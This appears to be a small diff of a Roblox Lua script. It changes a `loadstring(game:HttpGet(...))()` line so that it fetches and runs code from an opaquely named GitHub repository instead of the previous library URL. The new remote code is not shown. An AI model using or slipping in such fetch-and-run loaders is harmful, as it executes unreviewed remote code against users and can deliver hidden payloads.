@@ -1,5 +1,5 @@
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GelatekWasTaken/Project-Cat/main/Misc/LoadLibrary.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/micorockslol123/FOKWEOPFK/main/main"))()
 
 wait(1 / 60)
 Effects = { }
